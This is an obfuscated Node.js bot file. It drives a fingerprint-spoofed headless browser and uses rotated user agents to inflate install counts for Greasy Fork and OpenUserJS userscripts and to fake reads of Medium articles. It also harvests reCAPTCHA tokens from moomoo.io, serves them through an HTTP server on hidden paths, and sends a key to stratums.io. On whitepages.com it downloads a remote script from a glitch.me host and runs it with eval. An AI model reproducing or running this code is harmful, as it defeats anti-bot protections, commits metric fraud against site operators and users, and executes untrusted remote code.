      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x1d) + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x1d) + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + X(0x11) + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + X(0x12) + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + W(0xf) + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + V(0x15, 'P(k2') + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1ed1 + 0x1e85 + 0x4c
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x13dd * 0x1 + -0x8a1 + 0x2 * -0x59e)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x21f8 + 0x57 * -0x22 + -0x1606), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x75 * 0xd + 0x1a5 * 0x17 + 0xad8 * -0x4), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x3 * 0xb05 + 0x1cb * -0xd + 0x385e;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x4d9 + -0x6b * 0x11 + 0x242; w < getRandomInt(0x2291 + -0x246 + 0x2 * -0x1025, -0xa09 * -0x3 + 0xe * 0x1be + 0x1b3d * -0x2); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x3 * -0x27aa + -0x1a7a9 + -0x5 * -0x6bcf);
        }
      }();
    }, 0x1925 * 0x1 + 0x1 * -0x1e42 + 0x581 * 0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0xae0 + -0x12b0 + 0xfa * 0x8;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x2569 + -0x1a * -0x11b + -0x8ab * -0x1, 0x2102 + 0x1da0 + -0x534 * 0xc)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x9d01 * 0x1 + -0x8c97 + -0x34 * -0x7fa);
    }, 0x5ae * 0x2 + 0x12af + -0x1 * 0x1da7), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1ed9 * -0x1 + -0x1dc0 + -0x119;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x25de + 0xc19 + 0x257d), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1 * -0x647 + -0x1543 + 0xefc), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x13 * 0x14dfe + -0x2 * -0x7d3dd + 0x23 * 0xa740);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x41 * 0x31 + -0xf2b + 0x1c00);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x37 * 0x3f + 0xea2 + -0x1b63);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x516 + 0x2192 + -0x718);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = d,
    a0 = b,
    Z = c;
  async function f() {
    const Y = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xa * 0x249 + -0x1712 + 0xf4f * 0x3) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1403 * 0x1 + 0x1577 + -0x173 * 0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xbfe * -0x1 + -0x1dd + -0xa21, D['indexOf']('\x20'));
        return B ? E['slice'](0x2489 + 0xba4 + -0x3 * 0x100f, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x45 * -0x49 + -0x3aac + 0x3 * 0x1a05),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x11 * -0x435 + 0x49b0 + 0x761 * 0x5),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + Y(0x13) + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + Z(0x17) + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + Z(0x9) + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + Z(0x5) + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + a0(0xe, 'sN#o') + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + a0(0x1, '$4qA'),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a1(0x6) + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
